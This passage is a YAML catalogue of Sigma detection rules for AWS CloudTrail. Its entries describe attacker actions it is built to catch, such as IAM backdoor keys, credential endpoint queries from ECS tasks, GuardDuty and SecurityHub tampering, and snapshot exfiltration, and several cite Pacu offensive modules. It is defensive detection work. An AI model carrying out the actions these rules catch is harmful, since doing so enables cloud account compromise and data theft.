  predictive_readiness_factors: []
  severity: medium
  status: stable
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1486
  - T1565
  tags:
  - attack.impact
  - attack.t1486
  - attack.t1565
  time_window: ''
  references:
  - https://docs.aws.amazon.com/AWSEC2/latest/APIReference/API_DisableEbsEncryptionByDefault.html
  false_positives:
  - System Administrator Activities
  - DEV, UAT, SAT environment. You should apply this rule with PROD account only.
  notes: ''
- detection_id: 92f84194-8d9a-4ee0-8699-c30bfac59780
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_ec2_import_key_pair_activity.yml
  name: AWS Key Pair Import Activity
  description: 'Detects the import of SSH key pairs into AWS EC2, which may indicate
    an attacker attempting to gain unauthorized access to instances. This activity
    could lead to initial access, persistence, or privilege escalation, potentially
    compromising sensitive data and operations.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: experimental
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.initial-access
  - attack.defense-evasion
  - attack.t1078
  - attack.persistence
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://docs.aws.amazon.com/AWSEC2/latest/APIReference/API_ImportKeyPair.html
  false_positives:
  - Legitimate administrative actions by authorized users importing keys for valid
    purposes.
  - Automated processes for infrastructure setup may trigger this alert.
  - Verify the user identity, user agent, and source IP address to ensure they are
    expected.
  notes: ''
- detection_id: 1ab3c5ed-5baf-417b-bb6b-78ca33f6c3df
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_ec2_startup_script_change.yml
  name: AWS EC2 Startup Shell Script Change
  description: Detects changes to the EC2 instance startup script. The shell script
    will be executed as root/SYSTEM every time the specific instances are booted up.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  - T1059.003
  - T1059.004
  tags:
  - attack.execution
  - attack.t1059.001
  - attack.t1059.003
  - attack.t1059.004
  time_window: ''
  references:
  - https://github.com/RhinoSecurityLabs/pacu/blob/866376cd711666c775bbfcde0524c817f2c5b181/pacu/modules/ec2__startup_shell_script/main.py#L9
  false_positives:
  - Valid changes to the startup script
  notes: ''
- detection_id: 54b9a76a-3c71-4673-b4b3-2edb4566ea7b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_ec2_vm_export_failure.yml
  name: AWS EC2 VM Export Failure
  description: An attempt to export an AWS EC2 instance has been detected. A VM Export
    might indicate an attempt to extract information from an instance.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics:
  - Collection
  - Exfiltration
  techniques:
  - T1005
  - T1537
  tags:
  - attack.collection
  - attack.t1005
  - attack.exfiltration
  - attack.t1537
  time_window: ''
  references:
  - https://docs.aws.amazon.com/vm-import/latest/userguide/vmexport.html#export-instance
  false_positives: []
  notes: ''
- detection_id: b94bf91e-c2bf-4047-9c43-c6810f43baad
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_ecs_task_definition_cred_endpoint_query.yml
  name: AWS ECS Task Definition That Queries The Credential Endpoint
  description: 'Detects when an Elastic Container Service (ECS) Task Definition includes
    a command to query the credential endpoint.

    This can indicate a potential adversary adding a backdoor to establish persistence
    or escalate privileges.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1525
  tags:
  - attack.persistence
  - attack.t1525
  time_window: ''
  references:
  - https://github.com/RhinoSecurityLabs/pacu/blob/866376cd711666c775bbfcde0524c817f2c5b181/pacu/modules/ecs__backdoor_task_def/main.py
  - https://docs.aws.amazon.com/AmazonECS/latest/APIReference/API_RegisterTaskDefinition.html
  - https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task-iam-roles.html
  false_positives:
  - Task Definition being modified to request credentials from the Task Metadata Service
    for valid reasons
  notes: ''
- detection_id: 25cb1ba1-8a19-4a23-a198-d252664c8cef
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_efs_fileshare_modified_or_deleted.yml
  name: AWS EFS Fileshare Modified or Deleted
  description: 'Detects when a EFS Fileshare is modified or deleted.

    You can''t delete a file system that is in use.

    If the file system has any mount targets, the adversary must first delete them,
    so deletion of a mount will occur before deletion of a fileshare.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques: []
  tags:
  - attack.impact
  time_window: ''
  references:
  - https://docs.aws.amazon.com/efs/latest/ug/API_DeleteFileSystem.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6a7ba45c-63d8-473e-9736-2eaabff79964
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_efs_fileshare_mount_modified_or_deleted.yml
  name: AWS EFS Fileshare Mount Modified or Deleted
  description: Detects when a EFS Fileshare Mount is modified or deleted. An adversary
    breaking any file system using the mount target that is being deleted, which might
    disrupt instances or applications using those mounts.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1485
  tags:
  - attack.impact
  - attack.t1485
  time_window: ''
  references:
  - https://docs.aws.amazon.com/efs/latest/ug/API_DeleteMountTarget.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 33d50d03-20ec-4b74-a74e-1e65a38af1c0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_eks_cluster_created_or_deleted.yml
  name: AWS EKS Cluster Created or Deleted
  description: Identifies when an EKS cluster is created or deleted.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1485
  tags:
  - attack.impact
  - attack.t1485
  time_window: ''
  references:
  - https://any-api.com/amazonaws_com/eks/docs/API_Description
  false_positives:
  - EKS Cluster being created or deleted may be performed by a system administrator.
  - Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment.
  - EKS Cluster created or deleted from unfamiliar users should be investigated. If
    known behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: 4ae68615-866f-4304-b24b-ba048dfa5ca7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_elasticache_security_group_created.yml
  name: AWS ElastiCache Security Group Created
  description: Detects when an ElastiCache security group has been created.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1136
  - T1136.003
  tags:
  - attack.persistence
  - attack.t1136
  - attack.t1136.003
  time_window: ''
  references:
  - https://github.com/elastic/detection-rules/blob/598f3d7e0a63221c0703ad9a0ea7e22e7bc5961e/rules/integrations/aws/persistence_elasticache_security_group_creation.toml
  false_positives:
  - A ElastiCache security group may be created by a system or network administrator.
    Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment. Security group creations from unfamiliar users or
    hosts should be investigated. If known behavior is causing false positives, it
    can be exempted from the rule.
  notes: ''
- detection_id: 7c797da2-9cf2-4523-ba64-33b06339f0cc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_elasticache_security_group_modified_or_deleted.yml
  name: AWS ElastiCache Security Group Modified or Deleted
  description: Identifies when an ElastiCache security group has been modified or
    deleted.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1531
  tags:
  - attack.impact
  - attack.t1531
  time_window: ''
  references:
  - https://github.com/elastic/detection-rules/blob/7d5efd68603f42be5e125b5a6a503b2ef3ac0f4e/rules/integrations/aws/impact_elasticache_security_group_modified_or_deleted.toml
  false_positives:
  - A ElastiCache security group deletion may be done by a system or network administrator.
    Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment. Security Group deletions from unfamiliar users or
    hosts should be investigated. If known behavior is causing false positives, it
    can be exempted from the rule.
  notes: ''
- detection_id: f305fd62-beca-47da-ad95-7690a0620084
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_enum_buckets.yml
  name: Potential Bucket Enumeration on AWS
  description: Looks for potential enumeration of AWS buckets via ListBuckets.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1580
  - T1619
  tags:
  - attack.discovery
  - attack.t1580
  - attack.t1619
  time_window: ''
  references:
  - https://github.com/Lifka/hacking-resources/blob/c2ae355d381bd0c9f0b32c4ead049f44e5b1573f/cloud-hacking-cheat-sheets.md
  - https://jamesonhacking.blogspot.com/2020/12/pivoting-to-private-aws-s3-buckets.html
  - https://securitycafe.ro/2022/12/14/aws-enumeration-part-ii-practical-enumeration/
  false_positives:
  - Administrators listing buckets, it may be necessary to filter out users who commonly
    conduct this activity.
  notes: ''
- detection_id: 6e61ee20-ce00-4f8d-8aee-bedd8216f7e3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_guardduty_disruption.yml
  name: AWS GuardDuty Important Change
  description: Detects updates of the GuardDuty list of trusted IPs, perhaps to disable
    security alerts against malicious IPs.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://github.com/RhinoSecurityLabs/pacu/blob/866376cd711666c775bbfcde0524c817f2c5b181/pacu/modules/guardduty__whitelist_ip/main.py#L9
  false_positives:
  - Valid change in the GuardDuty (e.g. to ignore internal scanners)
  notes: ''
- detection_id: 0a5177f4-6ca9-44c2-aacf-d3f3d8b6e4d2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_iam_backdoor_users_keys.yml
  name: AWS IAM Backdoor Users Keys
  description: 'Detects AWS API key creation for a user by another user.

    Backdoored users can be used to obtain persistence in the AWS environment.

    Also with this alert, you can detect a flow of AWS keys in your org.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1098
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1098
  time_window: ''
  references:
  - https://github.com/RhinoSecurityLabs/pacu/blob/866376cd711666c775bbfcde0524c817f2c5b181/pacu/modules/iam__backdoor_users_keys/main.py
  false_positives:
  - Adding user keys to their own accounts (the filter cannot cover all possible variants
    of user naming)
  - AWS API keys legitimate exchange workflows
  notes: ''
- detection_id: db014773-b1d3-46bd-ba26-133337c0ffee
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_iam_s3browser_loginprofile_creation.yml
  name: AWS IAM S3Browser LoginProfile Creation
  description: Detects S3 Browser utility performing reconnaissance looking for existing
    IAM Users without a LoginProfile defined then (when found) creating a LoginProfile.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: high
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1059.009
  - T1078.004
  tags:
  - attack.execution
  - attack.persistence
  - attack.defense-evasion
  - attack.initial-access
  - attack.privilege-escalation
  - attack.t1059.009
  - attack.t1078.004
  time_window: ''
  references:
  - https://permiso.io/blog/s/unmasking-guivil-new-cloud-threat-actor
  false_positives:
  - Valid usage of S3 Browser for IAM LoginProfile listing and/or creation
  notes: ''
- detection_id: db014773-7375-4f4e-b83b-133337c0ffee
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_iam_s3browser_templated_s3_bucket_policy_creation.yml
  name: AWS IAM S3Browser Templated S3 Bucket Policy Creation
  description: Detects S3 browser utility creating Inline IAM policy containing default
    S3 bucket name placeholder value of "<YOUR-BUCKET-NAME>".
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1059.009
  - T1078.004
  tags:
  - attack.execution
  - attack.t1059.009
  - attack.persistence
  - attack.defense-evasion
  - attack.initial-access
  - attack.privilege-escalation
  - attack.t1078.004
  time_window: ''
  references:
  - https://permiso.io/blog/s/unmasking-guivil-new-cloud-threat-actor
  false_positives:
  - Valid usage of S3 browser with accidental creation of default Inline IAM policy
    without changing default S3 bucket name placeholder value
  notes: ''
- detection_id: db014773-d9d9-4792-91e5-133337c0ffee
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_iam_s3browser_user_or_accesskey_creation.yml
  name: AWS IAM S3Browser User or AccessKey Creation
  description: Detects S3 Browser utility creating IAM User or AccessKey.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1059.009
  - T1078.004
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.defense-evasion
  - attack.initial-access
  - attack.t1059.009
  - attack.t1078.004
  time_window: ''
  references:
  - https://permiso.io/blog/s/unmasking-guivil-new-cloud-threat-actor
  false_positives:
  - Valid usage of S3 Browser for IAM User and/or AccessKey creation
  notes: ''
- detection_id: 1279262f-1464-422f-ac0d-5b545320c526
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_kms_import_key_material.yml
  name: AWS KMS Imported Key Material Usage
  description: 'Detects the import or deletion of key material in AWS KMS, which can
    be used as part of ransomware attacks. This activity is uncommon and provides
    a high certainty signal.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: experimental
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1486
  - T1608.003
  tags:
  - attack.impact
  - attack.t1486
  - attack.resource-development
  - attack.t1608.003
  time_window: ''
  references:
  - https://www.chrisfarris.com/post/effective-aws-ransomware/
  - https://docs.aws.amazon.com/kms/latest/developerguide/ct-importkeymaterial.html
  - https://docs.aws.amazon.com/kms/latest/developerguide/ct-deleteimportedkeymaterial.html
  false_positives:
  - Legitimate use cases for imported key material are rare, but may include, Organizations
    with hybrid cloud architectures that import external key material for compliance
    requirements.
  - Development or testing environments that simulate external key management scenarios.
    Even in these cases, such activity is typically infrequent and should not add
    significant noise.
  notes: ''
- detection_id: ec541962-c05a-4420-b9ea-84de072d18f4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_lambda_function_url.yml
  name: New AWS Lambda Function URL Configuration Created
  description: 'Detects when a user creates a Lambda function URL configuration, which
    could be used to expose the function to the internet and potentially allow unauthorized
    access to the function''s IAM role for AWS API calls.

    This could give an adversary access to the privileges associated with the Lambda
    service role that is attached to that function.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: medium
  status: experimental
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.initial-access
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://docs.aws.amazon.com/lambda/latest/dg/API_CreateFunctionUrlConfig.html
  - https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-privilege-escalation/aws-lambda-privesc
  - https://www.wiz.io/blog/how-to-set-secure-defaults-on-aws
  false_positives:
  - Creating a Lambda function URL configuration may be performed by a system administrator.
    Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment.
  - Creating a Lambda function URL configuration from unfamiliar users should be investigated.
    If known behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: 97fbabf8-8e1b-47a2-b7d5-a418d2b95e3d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_new_lambda_layer_attached.yml
  name: AWS New Lambda Layer Attached
  description: 'Detects when a user attached a Lambda layer to an existing Lambda
    function.

    A malicious Lambda layer could execute arbitrary code in the context of the function''s
    IAM role.

    This would give an adversary access to resources that the function has access
    to.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: low
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://docs.aws.amazon.com/lambda/latest/dg/API_UpdateFunctionConfiguration.html
  - https://github.com/clearvector/lambda-spy
  false_positives:
  - Lambda Layer being attached may be performed by a system administrator. Verify
    whether the user identity, user agent, and/or hostname should be making changes
    in your environment.
  - Lambda Layer being attached from unfamiliar users should be investigated. If known
    behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: 4990c2e3-f4b8-45e3-bc3c-30b14ff0ed26
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_passed_role_to_glue_development_endpoint.yml
  name: AWS Glue Development Endpoint Activity
  description: Detects possible suspicious glue development endpoint activity.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
  - https://docs.aws.amazon.com/glue/latest/webapi/API_CreateDevEndpoint.html
  false_positives:
  - Glue Development Endpoint Activity may be performed by a system administrator.
    Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment.
  - If known behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: 8a63cdd4-6207-414a-85bc-7e032bd3c1a2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_rds_change_master_password.yml
  name: AWS RDS Master Password Change
  description: Detects the change of database master password. It may be a part of
    data exfiltration.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1020
  tags:
  - attack.exfiltration
  - attack.t1020
  time_window: ''
  references:
  - https://github.com/RhinoSecurityLabs/pacu/blob/866376cd711666c775bbfcde0524c817f2c5b181/pacu/modules/rds__explore_snapshots/main.py
  false_positives:
  - Benign changes to a db instance
  notes: ''
- detection_id: 457cc9ac-d8e6-4d1d-8c0e-251d0f11a74c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_rds_dbcluster_actions.yml
  name: Modification or Deletion of an AWS RDS Cluster
  description: Detects modifications to an RDS cluster or its deletion, which may
    indicate potential data exfiltration attempts, unauthorized access, or exposure
    of sensitive information.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: experimental
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1020
  tags:
  - attack.exfiltration
  - attack.t1020
  time_window: ''
  references:
  - https://docs.aws.amazon.com/AmazonRDS/latest/APIReference/API_ModifyDBCluster.html
  - https://docs.aws.amazon.com/AmazonRDS/latest/APIReference/API_DeleteDBCluster.html
  - https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-privilege-escalation/aws-rds-privesc#rds-modifydbinstance
  false_positives:
  - Verify if the modification or deletion was performed by an authorized administrator.
  - Confirm if the modification or deletion was part of a planned change or maintenance
    activity.
  notes: ''
- detection_id: c3f265c7-ff03-4056-8ab2-d486227b4599
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_rds_public_db_restore.yml
  name: Restore Public AWS RDS Instance
  description: Detects the recovery of a new public database instance from a snapshot.
    It may be a part of data exfiltration.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1020
  tags:
  - attack.exfiltration
  - attack.t1020
  time_window: ''
  references:
  - https://github.com/RhinoSecurityLabs/pacu/blob/866376cd711666c775bbfcde0524c817f2c5b181/pacu/modules/rds__explore_snapshots/main.py
  false_positives:
  - Unknown
  notes: ''
- detection_id: 8ad1600d-e9dc-4251-b0ee-a65268f29add
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_root_account_usage.yml
  name: AWS Root Credentials
  description: Detects AWS root account usage
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.004
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.initial-access
  - attack.persistence
  - attack.t1078.004
  time_window: ''
  references:
  - https://docs.aws.amazon.com/IAM/latest/UserGuide/id_root-user.html
  false_positives:
  - AWS Tasks That Require AWS Account Root User Credentials https://docs.aws.amazon.com/general/latest/gr/aws_tasks-that-require-root.html
  notes: ''
- detection_id: 3940b5f1-3f46-44aa-b746-ebe615b879e0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_route_53_domain_transferred_lock_disabled.yml
  name: AWS Route 53 Domain Transfer Lock Disabled
  description: Detects when a transfer lock was removed from a Route 53 domain. It
    is recommended to refrain from performing this action unless intending to transfer
    the domain to a different registrar.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors:
  - guardrail:ioc_only_cap
  severity: low
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1098
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.credential-access
  - attack.t1098
  time_window: ''
  references:
  - https://github.com/elastic/detection-rules/blob/c76a39796972ecde44cb1da6df47f1b6562c9770/rules/integrations/aws/persistence_route_53_domain_transfer_lock_disabled.toml
  - https://docs.aws.amazon.com/Route53/latest/APIReference/API_Operations_Amazon_Route_53.html
  - https://docs.aws.amazon.com/Route53/latest/APIReference/API_domains_DisableDomainTransferLock.html
  false_positives:
  - A domain transfer lock may be disabled by a system or network administrator. Verify
    whether the user identity, user agent, and/or hostname should be making changes
    in your environment. Activity from unfamiliar users or hosts should be investigated.
    If known behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: b056de1a-6e6e-4e40-a67e-97c9808cf41b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_route_53_domain_transferred_to_another_account.yml
  name: AWS Route 53 Domain Transferred to Another Account
  description: Detects when a request has been made to transfer a Route 53 domain
    to another AWS account.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: low
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1098
  tags:
  - attack.persistence
  - attack.credential-access
  - attack.privilege-escalation
  - attack.t1098
  time_window: ''
  references:
  - https://github.com/elastic/detection-rules/blob/c76a39796972ecde44cb1da6df47f1b6562c9770/rules/integrations/aws/persistence_route_53_domain_transferred_to_another_account.toml
  false_positives:
  - A domain may be transferred to another AWS account by a system or network administrator.
    Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment. Domain transfers from unfamiliar users or hosts should
    be investigated. If known behavior is causing false positives, it can be exempted
    from the rule.
  notes: ''
- detection_id: 78b3756a-7804-4ef7-8555-7b9024a02e2d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_s3_data_management_tampering.yml
  name: AWS S3 Data Management Tampering
  description: Detects when a user tampers with S3 data management in Amazon Web Services.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1537
  tags:
  - attack.exfiltration
  - attack.t1537
  time_window: ''
  references:
  - https://github.com/elastic/detection-rules/pull/1145/files
  - https://docs.aws.amazon.com/AmazonS3/latest/API/API_Operations.html
  - https://docs.aws.amazon.com/AmazonS3/latest/API/API_PutBucketLogging.html
  - https://docs.aws.amazon.com/AmazonS3/latest/API/API_PutBucketWebsite.html
  - https://docs.aws.amazon.com/AmazonS3/latest/API/API_PutBucketEncryption.html
  - https://docs.aws.amazon.com/AmazonS3/latest/userguide/setting-repl-config-perm-overview.html
  - https://docs.aws.amazon.com/AmazonS3/latest/API/API_RestoreObject.html
  false_positives:
  - A S3 configuration change may be done by a system or network administrator. Verify
    whether the user identity, user agent, and/or hostname should be making changes
    in your environment. S3 configuration change from unfamiliar users or hosts should
    be investigated. If known behavior is causing false positives, it can be exempted
    from the rule.
  notes: ''
- detection_id: a607e1fe-74bf-4440-a3ec-b059b9103157
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_securityhub_finding_evasion.yml
  name: AWS SecurityHub Findings Evasion
  description: Detects the modification of the findings on SecurityHub.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: stable
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562
  tags:
  - attack.defense-evasion
  - attack.t1562
  time_window: ''
  references:
  - https://docs.aws.amazon.com/cli/latest/reference/securityhub/
  false_positives:
  - System or Network administrator behaviors
  - DEV, UAT, SAT environment. You should apply this rule with PROD environment only.
  notes: ''
- detection_id: abae8fec-57bd-4f87-aff6-6e3db989843d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_snapshot_backup_exfiltration.yml
  name: AWS Snapshot Backup Exfiltration
  description: Detects the modification of an EC2 snapshot's permissions to enable
    access from another account
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1537
  tags:
  - attack.exfiltration
  - attack.t1537
  time_window: ''
  references:
  - https://www.justice.gov/file/1080281/download
  false_positives:
  - Valid change to a snapshot's permissions
  notes: ''
- detection_id: d3adb3ef-b7e7-4003-9092-1924c797db35
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_sso_idp_change.yml
  name: AWS Identity Center Identity Provider Change
  description: 'Detects a change in the AWS Identity Center (FKA AWS SSO) identity
    provider.

    A change in identity provider allows an attacker to establish persistent access
    or escalate privileges via user impersonation.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1556
  tags:
  - attack.persistence
  - attack.credential-access
